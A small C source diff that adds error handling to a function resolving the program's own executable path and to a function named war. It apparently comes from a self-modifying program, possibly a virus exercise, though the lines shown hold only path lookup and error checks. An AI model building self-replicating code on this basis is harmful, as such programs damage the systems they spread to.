@@ -60,7 +60,6 @@ static int abs_path(char *self_name) {
 
 	int ret = readlink(proc_self_exe, buf, PATH_MAX);
 	if (ret == -1) {
-		ft_strncpy(self_name, STR("dummy"), PATH_MAX);
 		return -1;
 	}
 	buf[ret] = '\0';
@@ -74,8 +73,9 @@ int war(size_t increment) {
 
 	char self_name[PATH_MAX];
 
-
-	abs_path(self_name);
+	if (abs_path(self_name) == -1) {
+		return -1;
+	}
 
 	struct stat st;
 	/* we could open the file with O_RDWR but text file is busy */
